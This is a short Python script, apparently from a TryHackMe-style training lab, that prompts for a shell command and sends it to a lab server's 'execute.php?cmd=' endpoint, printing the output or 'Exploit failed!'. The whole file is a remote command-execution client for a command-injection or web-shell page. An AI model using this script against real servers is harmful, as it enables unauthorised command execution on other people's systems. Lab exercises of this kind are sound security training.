import requests

url = "http://python.thm/labs/lab3/execute.php?cmd="

def exec_cmd():
    cmd=input('CMD>')
    print('Executing cmd:',cmd)
    response = requests.get(url + cmd)

    if response.status_code == 200:
        print(response.text)
    else:
        print('Exploit failed!')
    
exec_cmd()